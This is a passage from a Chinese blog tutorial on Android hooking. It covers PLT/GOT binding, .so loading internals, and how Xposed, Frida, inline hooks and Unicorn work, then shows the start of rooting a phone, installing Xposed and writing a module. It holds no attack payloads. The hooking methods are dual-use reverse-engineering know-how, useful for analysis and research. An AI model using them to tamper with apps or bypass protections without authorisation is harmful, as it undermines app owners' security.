用于存放需要延迟绑定的函数的地址</td>\n</tr>\n</tbody></table>\n<p>因此我们可以看一下程序调用PLT表和GOT表的逻辑</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/7.png\" alt=\"image-20220517105915852\"></p>\n<p>最后我们来详细看一下程序调用函数的变化流程：</p>\n<p><strong>程序第一次调用函数时：</strong></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/8.png\" alt=\"image-20220517105915852\"></p>\n<p>此时第一步由函数调用跳入到PLT表中，然后第二步PLT表跳到GOT表中，可以看到第三步由GOT表回跳到PLT表中，这时候进行压栈，把代表函数的ID压栈，接着第四步跳转到公共的PLT表项中，第5步进入到GOT表中，然后_dl_runtime_resolve对动态函数进行地址解析和重定位，第七步把动态函数真实的地址写入到GOT表项中，然后执行函数并返回，此时GOT表中就存放了函数的真实地址</p>\n<p><strong>之后函数被调用时：</strong></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/9.png\" alt=\"image-20220517105915852\"></p>\n<p>第一步还是由函数调用跳入到PLT表，但是第二步跳入到GOT表中时，由于这个时候该表项已经是动态函数的真实地址了，所以可以直接执行然后返回</p>\n<h2 id=\"三、NDK基础知识\"><a href=\"#三、NDK基础知识\" class=\"headerlink\" title=\"三、NDK基础知识\"></a>三、NDK基础知识</h2><p>这里我们主要介绍Android中的so文件加载的原理，为后面hook技术讲解做铺垫：</p>\n<h3 id=\"1-Android-so文件的类型\"><a href=\"#1-Android-so文件的类型\" class=\"headerlink\" title=\"1.Android so文件的类型\"></a>1.Android so文件的类型</h3><p>NDK开发的so不再具备跨平台特性，需要编译提供不同平台支持</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/10.png\" alt=\"image-20210919152200104\"></p>\n<p>我们从官网可以得知so文件在不同架构下也不同，这里依次对应<code>arm32位和64位，x86_32位和64位</code></p>\n<p>我们可以使用指令查看我们手机的架构：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">adb shell</span><br><span class=\"line\">cat /proc/cpuinfo</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/11.png\" alt=\"image-20210919155021588\"></p>\n<h3 id=\"2-so文件加载\"><a href=\"#2-so文件加载\" class=\"headerlink\" title=\"2.so文件加载\"></a>2.so文件加载</h3><p>Android中我们通常使用系统提供的两种API：System.loadLibrary或者System.load来加载so文件：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">//加载的是libnative-lib.so，注意的是这边只需要传入&quot;native-lib&quot;</span><br><span class=\"line\">System.loadLibrary(&quot;native-lib&quot;);</span><br><span class=\"line\">//传入的是so文件完整的绝对路径</span><br><span class=\"line\">System.load(&quot;/data/data/应用包名/lib/libnative-lib.so&quot;)</span><br></pre></td></tr></table></figure>\n\n<p>System.loadLibrary()和System.load()的区别：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">（<span class=\"number\">1</span>）loadLibray传入的是编译脚本指定生成的so文件名称，一般不需要包含开头的lib和结尾的.so，而load传入的是so文件所在的绝对路径</span><br><span class=\"line\">（<span class=\"number\">2</span>）loadLibrary传入的不能是路径，查找so时会优先从应用本地路径下(/data/data/$&#123;<span class=\"keyword\">package</span>-name&#125;/lib/arm/)进行查找，不存在的话才会从系统lib路径下(/system/lib、/vendor/lib等)进行查找；而load则没有路径查找的过程</span><br><span class=\"line\">（<span class=\"number\">3</span>）load传入的不能是sdcard路径，会导致加载失败，一般只支持应用本地存储路径/data/data/$&#123;<span class=\"keyword\">package</span>-name&#125;/，或者是系统lib路径system/lib等这<span class=\"number\">2</span>类路径</span><br><span class=\"line\">（<span class=\"number\">4</span>）loadLibrary加载的都是一开始就已经打包进apk或系统的so文件了，而load可以是一开始就打包进来的so文件，也可以是后续从网络下载，外部导入的so文件</span><br><span class=\"line\">（<span class=\"number\">5</span>）重复调用loadLibrar,load并不会重复加载so，会优先从已加载的缓存中读取，所以只会加载一次</span><br><span class=\"line\">（<span class=\"number\">6</span>）加载成功后会去搜索so是否有<span class=\"string\">&quot;JNI_OnLoad&quot;</span>，有的话则进行调用，所以<span class=\"string\">&quot;JNI_OnLoad&quot;</span>只会在加载成功后被主动回调一次，一般可以用来做一些初始化的操作，比如动态注册jni相关方法等</span><br></pre></td></tr></table></figure>\n\n<p><strong>源码分析：</strong></p>\n<p><strong>Android 6.0：</strong></p>\n<p>[System.java] java.lang.System:</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">  <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">load</span><span class=\"params\">(String pathName)</span> &#123;</span><br><span class=\"line\">        Runtime.getRuntime().load(pathName, VMStack.getCallingClassLoader());</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">loadLibrary</span><span class=\"params\">(String libName)</span> &#123;</span><br><span class=\"line\">       Runtime.getRuntime().loadLibrary(libName, VMStack.getCallingClassLoader());</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>[Runtime.java] java.lang.Runtime:</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"> <span class=\"keyword\">void</span> <span class=\"title function_\">load</span><span class=\"params\">(String absolutePath, ClassLoader loader)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (absolutePath == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">NullPointerException</span>(<span class=\"string\">&quot;absolutePath == null&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">error</span> <span class=\"operator\">=</span> doLoad(absolutePath, loader);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (error != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">UnsatisfiedLinkError</span>(error);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">loadLibrary</span><span class=\"params\">(String nickname)</span> &#123;</span><br><span class=\"line\">        loadLibrary(nickname, VMStack.getCallingClassLoader());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">void</span> <span class=\"title function_\">loadLibrary</span><span class=\"params\">(String libraryName, ClassLoader loader)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (loader != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"type\">String</span> <span class=\"variable\">filename</span> <span class=\"operator\">=</span> loader.findLibrary(libraryName);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (filename == <span class=\"literal\">null</span>) &#123;...</span><br></pre></td></tr></table></figure>\n\n<p>我们对比了Android6.0下的System.load和System.loadLibrary:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">我们可以发现System.loadLibrary()中会修改类加载器，这个在我们后面hook过程可能会报错，而Runtime.loadLibray()中有重写的方法，则可以正确实现</span><br></pre></td></tr></table></figure>\n\n<p><strong>Android 7.0：</strong></p>\n<p>[System.java] java.lang.System:</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">load</span><span class=\"params\">(String filename)</span> &#123;</span><br><span class=\"line\">      Runtime.getRuntime().load0(VMStack.getStackClass1(), filename);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">loadLibrary</span><span class=\"params\">(String libname)</span> &#123;</span><br><span class=\"line\">      Runtime.getRuntime().loadLibrary0(VMStack.getCallingClassLoader(), libname);</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n\n<p>[Runtime.java] java.lang.Runtime:</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">synchronized</span> <span class=\"keyword\">void</span> <span class=\"title function_\">load0</span><span class=\"params\">(Class fromClass, String filename)</span> &#123;</span><br><span class=\"line\">       <span class=\"keyword\">if</span> (!(<span class=\"keyword\">new</span> <span class=\"title class_\">File</span>(filename).isAbsolute())) &#123;</span><br><span class=\"line\">           <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">UnsatisfiedLinkError</span>(</span><br><span class=\"line\">               <span class=\"string\">&quot;Expecting an absolute path of the library: &quot;</span> + filename);        &#125;</span><br><span class=\"line\">       <span class=\"keyword\">if</span> (filename == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">           <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">NullPointerException</span>(<span class=\"string\">&quot;filename == null&quot;</span>);</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">       <span class=\"type\">String</span> <span class=\"variable\">error</span> <span class=\"operator\">=</span> doLoad(filename, fromClass.getClassLoader());</span><br><span class=\"line\">       <span class=\"keyword\">if</span> (error != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">           <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">UnsatisfiedLinkError</span>(error);</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">loadLibrary</span><span class=\"params\">(String libname, ClassLoader classLoader)</span> &#123;</span><br><span class=\"line\">       java.lang.System.logE(<span class=\"string\">&quot;java.lang.Runtime#loadLibrary(String, ClassLoader)&quot;</span> +</span><br><span class=\"line\">                             <span class=\"string\">&quot; is private and will be removed in a future Android release&quot;</span>);</span><br><span class=\"line\">      loadLibrary0(classLoader, libname);</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n\n<p>我们可以发现不同版本的区别：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Android <span class=\"number\">6.0</span>采用的是loadLibrary,<span class=\"number\">6.0</span>之后都采用的是loadLibrary0; 同理 load函数也一样,<span class=\"number\">6.0</span>之后采用的是load0</span><br></pre></td></tr></table></figure>\n\n<p>同时我们分析了loadLibrary0：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. classLoader存在时，通过classLoader.findLibrary(libraryName)来获取存放指定so文件的路径；</span><br><span class=\"line\">2. classLoader不存在时，则通过getLibPaths()接口来获取</span><br><span class=\"line\">3. 最终调用nativeLoad加载指定路径的so文件</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"四、各类hook技术原理分析\"><a href=\"#四、各类hook技术原理分析\" class=\"headerlink\" title=\"四、各类hook技术原理分析\"></a>四、各类hook技术原理分析</h2><p>hook技术就是指截获进程对某个API函数的调用，使得API的执行流程转向我们实现的代码片段，从而实现我们要的功能，在Android中使用hook的方法有很多，常用的Xposed和frida hook技术、inlinehook技术、基于inlinehook的开源框架Sandhook、PLT&#x2F;Got hook技术、以及当下模拟cpu的Unicorn的hook技术，下面我们将逐一介绍其原理。</p>\n<h3 id=\"1-Xposed-hook技术\"><a href=\"#1-Xposed-hook技术\" class=\"headerlink\" title=\"1.Xposed hook技术\"></a>1.Xposed hook技术</h3><p>Xposed的基本原理，我在<a href=\"https://bbs.pediy.com/thread-269627.htm\">源码编译（3）——Xposed框架定制</a>中已经给大家做了详细的讲解，其主要就是Android应用进程都是由 zygote 进程孵化而来，zygote对应的可执行程序就是app_process,posed 框架通过替换系统的 app_process 可执行文件以及虚拟机动态链接库，让 zygote 在启动应用程序进程时注入框架代码，进而实现对应用程序进程的劫持。</p>\n<p>具体怎么实现hook技术，Xposed就是通过修改了Art虚拟机，将需要hook的函数注册为Native函数，当执行这一函数时，虚拟机会优先执行Native函数，然后执行java函数，这样就成功完成了函数的hook。</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/12.png\" alt=\"image-20210919155021588\"></p>\n<p>具体实现流程:</p>\n<p>在 Android 系统启动的时候， zygote 进程加载 XposedBridge 将所有需要替换的 Method 通过 JNI 方法 hookMethodNative 指向 Native 方法 xposedCallHandler ， xposedCallHandler 在转入 handleHookedMethod 这个 Java 方法执行用户规定的 Hook Func</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/14.png\" alt=\"image-20220517133042720\"></p>\n<p>dvmCallMethodV会根据accessFlags决定调用native还是java函数，因此修改accessFlags后，Dalvik会认为这个函数是一个native函数，便走向了native分支也就是说Xposed在对java方法进行hook时，先将虚拟机里面这个方法的Method的accessFlag改为native对应的值，然后将该方法的nativeFunc指向自己实现的一个native方法，这样方法在调用时，就会调用到这个native方法，接管了控制权</p>\n<p>其他的就详细参考上篇文章了</p>\n<h3 id=\"2-Frida-hook技术\"><a href=\"#2-Frida-hook技术\" class=\"headerlink\" title=\"2.Frida hook技术\"></a>2.Frida hook技术</h3><p>frida 也是一种动态插桩工具，原理和Xposed hook一样，也是把java method转为native method，但是Art下的实现与Dalivk有所不同，这里就需要了解ART的运行机制，这里主要参考博客：<a href=\"https://mabin004.github.io/2018/07/31/Mac%E4%B8%8A%E7%BC%96%E8%AF%91Frida/\">Frida源码分析</a></p>\n<p>ART 是一种代替 Dalivk 的新的运行时,它具有更高的执行效率。ART虚拟机执行 Java 方法主要有两种模式：quick code 模式和 Interpreter 模式</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">quick code 模式：执行 arm 汇编指令</span><br><span class=\"line\">Interpreter 模式：由解释器解释执行 Dalvik 字节码</span><br></pre></td></tr></table></figure>\n\n<p>即使是在quick code模式中，也有类方法可能需要以Interpreter模式执行。反之亦然。解释执行的类方法通过函数artInterpreterToCompiledCodeBridge的返回值调用本地机器指令执行的类方法；本地机器指令执行的类方法通过函数GetQuickToInterpreterBridge的返回值调用解释执行的类方法</p>\n<p>这里引用博客中的一张图</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/15.png\" alt=\"image-20220517133042720\"></p>\n<p>如图，对于一个native方法，ART虚拟机会先尝试使用quickcode的模式去执行，并检查ARTMethod结构中的entry_point_from_quick_compiled<em>code</em>成员，这里分3种情况：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1.如果函数已经存在quick code, 则指向这个函数对应的 quick code的起始地址，而当quick code不存在时，它的值则会代表其他的意义；</span><br><span class=\"line\">2.当一个 java 函数不存在 quick code时，它的值是函数 artQuickToInterpreterBridge 的地址，用以从 quick 模式切换到 Interpreter 模式来解释执行 java 函数代码；</span><br><span class=\"line\">3.当一个 java native（JNI）函数不存在 quick code时，它的值是函数 art_quick_generic_jni_trampoline 的地址，用以执行没有quick code的 jni 函数</span><br></pre></td></tr></table></figure>\n\n<p>因此，frida将一个java method修改jni mthod 显然是不存在quick code，这时需要将entry_point_from_quick_compiled<em>code</em>值修改为art_quick_generic_jni_trampoline 的地址</p>\n<p>总结，frida把java method改为jni method，需要修改ARTMethod结构体中的这几个值：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">accessflags = native</span><br><span class=\"line\">entry_point_fromjni = 自定义代码的入口</span><br><span class=\"line\">entry_point_from_quick_compiledcode = art_quick_generic_jni_trampoline函数的地址</span><br><span class=\"line\">entry_point_frominterpreter = artInterpreterToCompiledCodeBridge函数地址</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-inlinehook-技术\"><a href=\"#3-inlinehook-技术\" class=\"headerlink\" title=\"3.inlinehook 技术\"></a>3.inlinehook 技术</h3><h4 id=\"（1）基本原理\"><a href=\"#（1）基本原理\" class=\"headerlink\" title=\"（1）基本原理\"></a>（1）基本原理</h4><p>首先，我们先介绍一下什么是inline Hook:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">inline Hook是一种拦截目标函数调用的方法，主要用于杀毒软件、沙箱和恶意软件。一般的想法是将一个函数重定向到我们自己的函数，以便我们可以在函数执行它之前和/或之后执行处理；这可能包括：检查参数、填充、记录、欺骗返回的数据和过滤调用。</span><br><span class=\"line\">hook是通过直接修改目标函数内的代码来放置，通常是用跳转覆盖的前几个字节，允许在函数进行任何处理之前重定向执行。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（2）inlineHook组成\"><a href=\"#（2）inlineHook组成\" class=\"headerlink\" title=\"（2）inlineHook组成\"></a>（2）inlineHook组成</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">hook:一个5字节的相对跳转，在被写入目标函数以钩住它，跳转将从被钩住的函数跳转到我们的代码</span><br><span class=\"line\">proxy:这是我们指定的函数（或代码），放置在目标函数上的钩子将跳转到该函数（或代码）</span><br><span class=\"line\">Trampoline:用于绕过钩子，以便我们可以正常调用钩子函数</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（3）inlineHook实现\"><a href=\"#（3）inlineHook实现\" class=\"headerlink\" title=\"（3）inlineHook实现\"></a>（3）inlineHook实现</h4><p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/16.png\" alt=\"image-20210918161352124\"></p>\n<p>从示意图上，我们可以这样理解：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">我们将目标函数MessgeBoxA()中的地址拿出来，然后我们用重写的hook函数替换，然后我们执行完成之后，再回调到函数的执行地址出，保证程序的正常运行</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/17.png\" alt=\"image-20210919152200104\"></p>\n<p>我们也可以通过上述示意图去理解inlinehook的基本原理</p>\n<h4 id=\"（4）Android-Inline-Hook和SandHook-技术\"><a href=\"#（4）Android-Inline-Hook和SandHook-技术\" class=\"headerlink\" title=\"（4）Android-Inline-Hook和SandHook 技术\"></a>（4）Android-Inline-Hook和SandHook 技术</h4><p>Android-lnline-Hook和SandHook都是基于inlinehook的两种开源框架，在Android中对native层hook，使用的比较常见，前者主要针对32位进行hook，后者即可以用于32位也可以用于64位，但是官方表示32位并未进行测试，所以应用在64位上仍然更多</p>\n<h3 id=\"4-PLT-x2F-GOT-hook技术\"><a href=\"#4-PLT-x2F-GOT-hook技术\" class=\"headerlink\" title=\"4.PLT&#x2F;GOT hook技术\"></a>4.PLT&#x2F;GOT hook技术</h3><p>前面我们已经很详细的讲述了全局偏移表（GOT）和动态链接表（PLT）,Inline Hook能Hook几乎所有函数，但是兼容性较差，不能达到上线标准,相比于inlineHook，GOT Hook兼容性比较好，可以达到上线标准，但是只能Hook基于GOT表的一些函数</p>\n<p>GOT&#x2F;PLT Hook 主要是通过解析SO文件，将待hook函数在got表的地址替换为自己函数的入口地址，这样目标进程每次调用待hook函数时，实际上是执行了我们自己的函数</p>\n<p>这里我们还要理解GOT表中含包含了导入表和导出表</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">导出表指将当前动态库的一些函数符号保留，供外部调用</span><br><span class=\"line\">导入表中的函数实际是在该动态库中调用外部的导出函数</span><br></pre></td></tr></table></figure>\n\n<p>例如导入表存放的是一些其他so的函数，例如libc的open，而导出表存放的是一些共其他so调用的函数，比如自己so中编写的函数，而无论导入表还是导出表基本都是针对导出函数，针对非导出函用inlinehook更常用一些</p>\n<h3 id=\"5-Unicorn-hook技术\"><a href=\"#5-Unicorn-hook技术\" class=\"headerlink\" title=\"5.Unicorn hook技术\"></a>5.Unicorn hook技术</h3><p>Unicore是一款非常优秀的跨平台模拟执行框架，该框架可以跨平台执行Arm, Arm64 (Armv8), M68K, Mips, Sparc, &amp; X86 (include X86_64)等指令集的原生程序，通过模拟CPU，可以实现很多强大的功能，也可以实现函数级别的Hook</p>\n<p>参考资料：无名大佬文章<a href=\"https://bbs.pediy.com/thread-253868.htm#msg_header_h1_7\">Unicorn 在 Android 的应用</a></p>\n<p>nicorn 内部并没有函数的概念，它只是一个单纯的CPU， 没有HOOK_FUNCTION的callback，AndroidNativeEmu 中的函数级Hook 并不是真正意义上的Hook，它不仅能Hook存在的函数，还能Hook不存在的函数。AndroidNativeEmu 使用这种技术实现了JNI函数Hook、库函数Hook。 Jni函数是不存的，Hook它只是为了能够用Python 实现 Jni Functions。有一些库函数是存在的，Hook只是为了重新实现它</p>\n<h2 id=\"五、各类hook技术实操\"><a href=\"#五、各类hook技术实操\" class=\"headerlink\" title=\"五、各类hook技术实操\"></a>五、各类hook技术实操</h2><h3 id=\"1-Xposed-hook实操\"><a href=\"#1-Xposed-hook实操\" class=\"headerlink\" title=\"1.Xposed hook实操\"></a>1.Xposed hook实操</h3><h4 id=\"（1）环境安装\"><a href=\"#（1）环境安装\" class=\"headerlink\" title=\"（1）环境安装\"></a>（1）环境安装</h4><p>Xposed环境安装详细可以参考我写的Xposed系列文章，这里只是简单的总结一下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">(<span class=\"number\">1</span>) <span class=\"number\">4.4</span>以下Android版本安装比较简单，只需要两步即可</span><br><span class=\"line\">\t<span class=\"number\">1.</span>对需要安装Xposed的手机进行root</span><br><span class=\"line\">\t<span class=\"number\">2.</span>下载并安装xposedInstaller,之后授权其root权限，进入app点击安装即可</span><br><span class=\"line\">    但是由于官网不在维护，导致无法直接通过xposedinstaller下载补丁包</span><br><span class=\"line\">（<span class=\"number\">2</span>）Android <span class=\"number\">5.0</span>-<span class=\"number\">8.0</span> 由于<span class=\"number\">5.0</span>后出现ART，所以安装步骤分成两个部分：xposed.zip 和 </span><br><span class=\"line\">    XposedInstaller.apk,zip文件是框架主体，需要进入Recovery后刷入，apk文件用于Xposed管理</span><br><span class=\"line\">    <span class=\"number\">1.</span>完成对手机的root，并刷入reconvery(比如twrp),使用Superroot</span><br><span class=\"line\">    <span class=\"number\">2.</span>下载你对应的zip补丁包，并进入recovery刷入</span><br><span class=\"line\">    <span class=\"number\">3.</span>重启手机，安装xposedInstaller并授予root权限即可</span><br><span class=\"line\">    官网地址：https:<span class=\"comment\">//dl-xda.xposed.info/framework/</span></span><br><span class=\"line\">（<span class=\"number\">3</span>）由于Android <span class=\"number\">8.0</span>后，Xposed官方作者没有再对其更新，我们一般就使用国内大佬riyu的Edxposed框架</span><br><span class=\"line\">\tMagisk + riyu + Edxposed</span><br></pre></td></tr></table></figure>\n\n<p>这里我们用的是nexus5进行操作，简单演示一下android6.0的Xposed安装</p>\n<p>资源准备：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">asop镜像：https://developers.google.com/android/ota#hammerhead</span><br><span class=\"line\">twrp:     https://twrp.me/</span><br><span class=\"line\">xposed:   https://dl-xda.xposed.info/framework/</span><br><span class=\"line\">xposed installer https://repo.xposed.info/module/de.robv.android.xposed.installer</span><br></pre></td></tr></table></figure>\n\n<p>首先我们先下载n5镜像，然后刷机，这里我们已经安装就不再安装了</p>\n<p>然后我们刷入 twrp-3.4.0-0-hammerhead.img </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">fastboot flash recovery twrp-3.4.0-0-hammerhead.img </span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/18.png\" alt=\"image-20210919152200104\"></p>\n<p>然后我们就可以进入recovery模式了</p>\n<p>然后我们将Supersu拷贝进去，然后将Xposed-v89-sdk.zip拷贝进去</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/19.png\" alt=\"image-20210919152200104\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/20.png\" alt=\"image-20210919152200104\"></p>\n<p>然后我们进入recovery模式，将两个文件依次刷入即可</p>\n<p>接下来我们安装XposedInstall.apk,来管理Xposed</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/21.png\" alt=\"image-20210919152200104\"></p>\n<p>如果我们开机后发现xposed框架没有激活，尝试再重启一下，我们可以看见</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/22.png\" alt=\"image-20210919152200104\"></p>\n<p>这样我们的Xposed框架就成功安装了</p>\n<h4 id=\"（2）Xposed插件编写\"><a href=\"#（2）Xposed插件编写\" class=\"headerlink\" title=\"（2）Xposed插件编写\"></a>（2）Xposed插件编写</h4><p>Xposed插件编写的流程网上已经有很多了，这里我就简单的讲解一下</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">基本流程：</span><br><span class=\"line\">\t(<span class=\"number\">1</span>)拷贝XposedBridgeApi.jar到新建工程的libs目录</span><br><span class=\"line\">\t(<span class=\"number\">2</span>)修改app目录下的build.gradle文件，在AndroidManifest.xml中增加Xposed相关内容</span><br><span class=\"line\">\t(<span class=\"number\">3</span>)新建hook类，编写hook代码</span><br><span class=\"line\">\t(<span class=\"number\">4</span>)新建assets文件夹，然后在assets目录下新建文件xposed_init,在里面写上hook类的完整路径</span><br></pre></td></tr></table></figure>\n\n<p>首先，我们查找XposedBridgeApi.jar到新建工程的libs目录：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0006/23.png\" alt=\"image-20210919152200104\"></p>\n<p>然后，修改AndroidManifest.xml文件，在Application标签下增加内容如下：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;meta-data</span><br><span class=\"line\">    <span class=\"attr\">android</span>:name=<span class=\"string\">&quot;xposedmodule&quot;</span>   <span class=\"comment\">//是否配置为Xposed插件，设置为true</span></span><br><span class=\"line\">    <span class=\"attr\">android</span>:value=<span class=\"string\">&quot;true&quot;</span>/&gt;</span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">meta-data</span></span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"language-xml\">    <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;xposeddescription&quot;</span>   //<span class=\"attr\">模块名称</span></span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"language-xml\">    <span class=\"attr\">android:value</span>=<span class=\"string\">&quot;模块描述&quot;</span>/&gt;</span></span></span><br><span class=\"line\"><span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">meta-data</span></span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"language-xml\">    <span class=\"attr\">android:name</span>=<span class=\"string\">&quot;xposedminversion&quot;</span>   //<span class=\"attr\">最低版本号</span></span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"language-xml\">    <span class=\"attr\">android:value</span>=<span class=\"string\">&quot;54&quot;</span>/&gt;</span></span></span><br></pre></td></tr></table></figure>\n\n<p>修改app目录下的build.gradle文件：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">进入app目录下的build.<span class=\"property\">gradle</span>文件，\t</span><br><span class=\"line\">\tcompile <span class=\"title function_\">fileTree</span>(<span class=\"attr\">includes</span>:[<span class=\"string\">&#x27;*.jar&#x27;</span>],<span class=\"attr\">dir</span>:<span class=\"string\">&#x27;libs&#x27;</span>)</span><br><span class=\"line\">\t替换成</span><br><span class=\"line\">\tprovided <span class=\"title function_\">fileTree</span>(<span class=\"attr\">includes</span>:[<span class=\"string\">&#x27;*.jar&#x27;</span>],<span class=\"attr\">dir</span>:<span class=\"string\">&#x27;libs&#x27;</span>)</span><br><span class=\"line\">现在provided变为 compileOnly </span><br><span class=\"line\">如果使用compile,可以正常编译生成插件apk,但是当安装到手机上后，xposed会报错，无法正常工作</span><br></pre></td></tr></table></figure>\n\n<p>编写hook类：</p>\n<p>我们新建一个hook类xposed01，并实现接口IXposedHookLoadPackage,并实现里面关键方法handleLoadPackage(XC_LoadPackage.LoadPackageParam loadPackageParam)，该方法会在每个软件被启动的时候回调，所以一般需要通过目标包名过滤</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Xposed01</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">IXposedHookLoadPackage</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">handleLoadPackage</span><span class=\"params\">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class=\"keyword\">throws</span> Throwable &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(loadPackageParam.packageName.equals(<span class=\"string\">&quot;com.example.xposedlesson2&quot;</span>))&#123;  <span class=\"comment\">//判断目标包名</span></span><br><span class=\"line\">            XposedBridge.log(<span class=\"string\">&quot;XLZH&quot;</span>+loadPackageParam.packageName);  <span class=\"comment\">//打出包名的信息</span></span><br><span class=\"line\">            Log.i(<span 